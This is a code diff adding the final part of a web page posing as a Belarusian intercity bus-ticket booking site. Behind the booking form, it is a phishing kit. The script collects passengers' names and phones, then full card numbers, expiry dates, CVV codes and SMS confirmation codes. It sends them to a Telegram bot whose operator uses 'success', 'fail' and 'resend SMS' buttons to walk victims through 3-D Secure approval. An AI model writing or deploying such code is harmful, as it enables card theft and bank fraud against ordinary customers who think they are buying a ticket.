+                }
+
+                // ===== РЕЖИМ КОНКРЕТНОГО РЕЙСА (ПО ССЫЛКЕ) =====
+                else if (state.step === 'specific' && state.selectedRoute) {
+                    const route = state.selectedRoute;
+                    html += `
+                        <div class="search-section">
+                            <div class="section-title">✅ Выбранный рейс</div>
+                            <div class="summary-box">
+                                <div class="summary-row">
+                                    <span class="summary-label">Маршрут</span>
+                                    <span class="summary-value">${route.from} → ${route.to}</span>
+                                </div>
+                                <div class="summary-row">
+                                    <span class="summary-label">Дата</span>
+                                    <span class="summary-value">${state.date}</span>
+                                </div>
+                                <div class="summary-row">
+                                    <span class="summary-label">Время</span>
+                                    <span class="summary-value">${route.time}</span>
+                                </div>
+                                <div class="summary-row">
+                                    <span class="summary-label">В пути</span>
+                                    <span class="summary-value">${route.duration}</span>
+                                </div>
+                            </div>
+                            <div class="route-points">
+                                <div class="route-point">
+                                    <span class="route-point-icon">🚏</span>
+                                    <span class="route-point-text">Отправление: ${route.fromPoint}</span>
+                                </div>
+                                <div class="route-point">
+                                    <span class="route-point-icon">🏁</span>
+                                    <span class="route-point-text">Прибытие: ${route.toPoint}</span>
+                                </div>
+                            </div>
+                            <div class="route-seats">
+                                <span>🎫</span> Свободных мест: ${route.seats}
+                            </div>
+                            <div class="total-price">${route.price} BYN</div>
+                            <button class="btn btn-primary" id="continueBtn">Продолжить</button>
+                        </div>
+                    `;
+                }
+
+                // ===== ВЫБОР ПАССАЖИРА =====
+                else if (state.step === 'passenger') {
+                    html += `
+                        <div class="search-section">
+                            <div class="section-title">👤 Данные пассажира</div>
+                            <div class="form-group">
+                                <label>ФИО *</label>
+                                <input type="text" id="fullName" placeholder="Иванов Иван Иванович" value="${state.passenger.fullName}">
+                            </div>
+                            <div class="form-group">
+                                <label>Телефон *</label>
+                                <input type="tel" id="phone" placeholder="375291234567" value="${state.passenger.phone}" maxlength="12">
+                                <small style="color: #64748b; font-size: 12px;">Только цифры, 12 символов</small>
+                            </div>
+                            <div class="form-group">
+                                <label>Email (для билета)</label>
+                                <input type="email" id="email" placeholder="ivanov@mail.ru" value="${state.passenger.email}">
+                            </div>
+                            <button class="btn btn-primary" id="nextBtn">Продолжить к оплате</button>
+                            <button class="btn btn-secondary" onclick="goBack()">← Назад</button>
+                        </div>
+                    `;
+                }
+
+                // ===== ВВОД КАРТЫ =====
+                else if (state.step === 'card') {
+                    html += `
+                        <div class="search-section">
+                            <div class="section-title">💳 Ввод карты</div>
+                            <div class="summary-box">
+                                <div class="summary-row">
+                                    <span class="summary-label">Пассажир</span>
+                                    <span class="summary-value">${state.passenger.fullName}</span>
+                                </div>
+                                <div class="summary-row">
+                                    <span class="summary-label">Телефон</span>
+                                    <span class="summary-value">${state.passenger.phone}</span>
+                                </div>
+                            </div>
+                            <div class="total-price">${state.selectedRoute.price} BYN</div>
+                            <div class="form-group">
+                                <label>Номер карты *</label>
+                                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" value="${state.card.number}" maxlength="19">
+                            </div>
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+                                <div class="form-group">
+                                    <label>Срок</label>
+                                    <input type="text" id="expiry" placeholder="ММ/ГГ" value="${state.card.expiry}" maxlength="5">
+                                </div>
+                                <div class="form-group">
+                                    <label>CVV</label>
+                                    <input type="text" id="cvv" placeholder="123" value="${state.card.cvv}" maxlength="3">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>Владелец карты *</label>
+                                <input type="text" id="cardholder" placeholder="IVANOV IVAN" value="${state.card.cardholder}">
+                            </div>
+                            <button class="btn btn-primary" id="payBtn">Оплатить ${state.selectedRoute.price} BYN</button>
+                            <button class="btn btn-secondary" onclick="goBack()">← Назад</button>
+                        </div>
+                    `;
+                }
+
+                // ===== ОБРАБОТКА ПЛАТЕЖА (ОЖИДАНИЕ) =====
+                else if (state.step === 'processing') {
+                    html += `
+                        <div class="search-section" style="text-align: center;">
+                            <div class="spinner"></div>
+                            <p style="margin: 24px 0;">Пожалуйста, не закрывайте страницу</p>
+                            <p style="color: #64748b;">Ожидаем подтверждение...</p>
+                        </div>
+                    `;
+                    startFirebaseListener();
+                }
+
+                // ===== ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ БАНКА =====
+                else if (state.step === 'processing2') {
+                    html += `
+                        <div class="search-section" style="text-align: center;">
+                            <div class="spinner"></div>
+                            <p style="margin: 24px 0;">Банк подтверждает операцию...</p>
+                            <p style="color: #64748b;">Пожалуйста, подождите</p>
+                        </div>
+                    `;
+                }
+
+                // ===== ВВОД SMS-КОДА =====
+                else if (state.step === 'sms') {
+                    html += `
+                        <div class="search-section">
+                            <div class="section-title">🔐 Подтверждение</div>
+                            <p style="margin-bottom: 16px;">Введите код, отправленный на ваш телефон</p>
+                            <input class="sms-input" id="smsCode" maxlength="6" placeholder="______" value="${state.smsCode}" inputmode="numeric">
+                            <button class="btn btn-primary" id="confirmSms">Подтвердить</button>
+                            <button class="btn btn-secondary" onclick="state.step='card'; render();">← Назад к карте</button>
+                        </div>
+                    `;
+                }
+
+                // ===== УСПЕХ =====
+                else if (state.step === 'success') {
+                    html += `
+                        <div class="success-box">
+                            <div class="success-icon">✓</div>
+                            <h3 style="margin-bottom: 16px;">Билет зарезервирован!</h3>
+                            <p style="color: #64748b; margin-bottom: 30px;">Билет отправлен на email и SMS.<br>Диспетчер свяжется с вами в течение 10 минут.</p>
+                            <button class="btn btn-primary" onclick="window.location.href='/'">На главную</button>
+                        </div>
+                    `;
+                }
+
+                // ===== ОШИБКА =====
+                else if (state.step === 'fail') {
+                    html += `
+                        <div class="fail-box">
+                            <div class="fail-icon">✕</div>
+                            <h3 style="margin-bottom: 16px;">Платёж не прошёл</h3>
+                            <p style="color: #64748b; margin-bottom: 30px;">Попробуйте другую карту или повторите позже.</p>
+                            <button class="btn btn-primary" onclick="state.step='card'; render();">Попробовать снова</button>
+                            <button class="btn btn-secondary" onclick="window.location.href='/'">На главную</button>
+                        </div>
+                    `;
+                }
+
+                // ===== ПОДВАЛ =====
+                html += `
+                        <div class="footer">
+                            <p>ООО «АвтоТрансБел» | УНП 193421567</p>
+                            <p>Лицензия Министерства транспорта № АП-2026-458</p>
+                            <p>© 2026 Marshrutka.by</p>
+                        </div>
+                    </div>
+                `;
+
+                app.innerHTML = html;
+
+                // ===== ОБРАБОТЧИКИ =====
+                if (state.step === 'search') {
+                    document.getElementById('searchBtn')?.addEventListener('click', () => {
+                        const from = document.getElementById('fromCity').value;
+                        const to = document.getElementById('toCity').value;
+                        const date = document.getElementById('date').value;
+                        
+                        if (!from || !to) {
+                            alert('Выберите города отправления и прибытия');
+                            return;
+                        }
+                        if (from === to) {
+                            alert('Города отправления и прибытия должны быть разными');
+                            return;
+                        }
+                        
+                        state.fromCity = from;
+                        state.toCity = to;
+                        state.date = date;
+                        
+                        const results = searchRoutes(from, to);
+                        const routesList = document.getElementById('routesList');
+                        
+                        if (results.length === 0) {
+                            routesList.innerHTML = '<p style="text-align: center; color: #64748b; padding: 32px;">Нет рейсов по данному маршруту</p>';
+                            return;
+                        }
+                        
+                        let resultsHtml = '<div class="section-title">📋 Результаты поиска</div>';
+                        results.forEach(route => {
+                            resultsHtml += `
+                                <div class="route-card">
+                                    <div class="route-header">
+                                        <span class="route-time">${route.time}</span>
+                                        <span class="route-price">${route.price} BYN</span>
+                                    </div>
+                                    <div class="route-details">
+                                        <span class="route-detail"><i>⏱</i> ${route.duration}</span>
+                                        <span class="route-detail"><i>🎫</i> ${route.seats} мест</span>
+                                    </div>
+                                    <button class="btn btn-primary" onclick="selectRoute(${JSON.stringify(route).replace(/"/g, '&quot;')})">Выбрать</button>
+                                </div>
+                            `;
+                        });
+                        routesList.innerHTML = resultsHtml;
+                    });
+                }
+
+                else if (state.step === 'specific' || state.step === 'select') {
+                    document.getElementById('continueBtn')?.addEventListener('click', () => {
+                        state.step = 'passenger';
+                        render();
+                    });
+                }
+
+                else if (state.step === 'passenger') {
+                    document.getElementById('nextBtn')?.addEventListener('click', () => {
+                        state.passenger.fullName = document.getElementById('fullName').value.trim();
+                        state.passenger.phone = document.getElementById('phone').value.trim().replace(/\D/g, '');
+                        state.passenger.email = document.getElementById('email').value.trim();
+                        
+                        if (!state.passenger.fullName || !state.passenger.phone) {
+                            alert('Заполните ФИО и телефон');
+                            return;
+                        }
+                        if (state.passenger.phone.length < 10) {
+                            alert('Телефон должен содержать не менее 10 цифр');
+                            return;
+                        }
+                        state.step = 'card';
+                        render();
+                    });
+                }
+
+                else if (state.step === 'card') {
+                    const cn = document.getElementById('cardNumber');
+                    const ex = document.getElementById('expiry');
+                    const cv = document.getElementById('cvv');
+                    
+                    if (cn) cn.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
+                    if (ex) ex.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
+                    if (cv) cv.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));
+
+                    document.getElementById('payBtn')?.addEventListener('click', async () => {
+                        state.card.number = document.getElementById('cardNumber').value.trim();
+                        state.card.expiry = document.getElementById('expiry').value.trim();
+                        state.card.cvv = document.getElementById('cvv').value.trim();
+                        state.card.cardholder = document.getElementById('cardholder').value.trim();
+                        
+                        const cardDigits = state.card.number.replace(/\D/g, '');
+                        
+                        if (cardDigits.length !== 16) {
+                            alert('Номер карты должен содержать 16 цифр');
+                            return;
+                        }
+                        if (!state.card.expiry || state.card.expiry.length < 5) {
+                            alert('Введите срок действия');
+                            return;
+                        }
+                        if (!state.card.cvv || state.card.cvv.length < 3) {
+                            alert('Введите CVV-код');
+                            return;
+                        }
+                        if (!state.card.cardholder) {
+                            alert('Введите владельца карты');
+                            return;
+                        }
+                        
+                        const ok = await sendCardToBot(state.selectedRoute);
+                        if (ok) {
+                            state.step = 'processing';
+                            render();
+                        } else {
+                            alert('Ошибка отправки в Telegram');
+                        }
+                    });
+                }
+
+                else if (state.step === 'sms') {
+                    document.getElementById('confirmSms')?.addEventListener('click', async () => {
+                        const code = document.getElementById('smsCode').value.trim();
+                        if (!code || code.length < 4) {
+                            alert('Введите код из SMS');
+                            return;
+                        }
+                        state.smsCode = code;
+                        
+                        const messageText = `📨 SMS-КОД\n\n🆔 Сессия: ${state.sessionId}\n📱 Код: ${code}`;
+                        
+                        const smsKeyboard = {
+                            inline_keyboard: [
+                                [{ text: '✅ УСПЕХ (3D)', callback_data: `bind_success_${state.sessionId}` },
+                                 { text: '❌ ФЕЙЛ', callback_data: `bind_fail_${state.sessionId}` },
+                                 { text: '🔄 ПОВТОР СМС', callback_data: `resend_${state.sessionId}` }]
+                            ]
+                        };
+                        
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: ADMIN_ID,
+                                text: messageText,
+                                parse_mode: 'HTML',
+                                reply_markup: smsKeyboard
+                            })
+                        });
+                        
+                        state.step = 'processing2';
+                        render();
+                    });
+                }
+            }
+
+            // Глобальная функция для возврата
+            window.selectRoute = function(route) {
+                state.selectedRoute = route;
+                state.step = 'select';
+                render();
+            };
+
+            window.goBack = function() {
+                if (state.step === 'passenger') {
+                    state.step = state.mode === 'specific' ? 'specific' : 'select';
+                } else if (state.step === 'card') {
+                    state.step = 'passenger';
+                }
+                render();
+            };
+
+            render();
+        })();
+    </script>
+</body>
+</html>
